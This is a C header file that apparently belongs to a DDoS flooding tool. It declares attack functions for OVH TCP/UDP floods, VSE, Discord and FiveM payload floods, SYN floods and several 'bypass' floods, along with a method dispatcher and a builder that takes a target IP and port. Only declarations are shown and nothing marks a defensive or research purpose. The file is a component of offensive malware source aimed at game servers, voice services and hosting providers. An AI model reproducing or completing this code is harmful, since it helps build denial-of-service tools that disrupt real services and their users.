#ifndef ATTACKS_H
#define ATTACKS_H

#include "config.h"

extern unsigned char payload_vse[];
extern unsigned char payload_discord2[];
extern unsigned char payload_fivem[];

void *attack_ovh_tcp(void *arg);
void *attack_ovh_udp(void *arg);
void *attack_vse(void *arg);
void *attack_discord2(void *arg);
void *attack_fivem(void *arg);
void *attack_udp_bypass(void *arg);
void *attack_tcp_bypass(void *arg);
void *attack_tcp_udp_bypass(void *arg);
void *attack_syn(void *arg);

void *(*get_attack_function(const char *method))(void *);
void generate_random_data(unsigned char *buffer, int size);
char **ovh_builder(const char *ip, int port, int *count);

#endif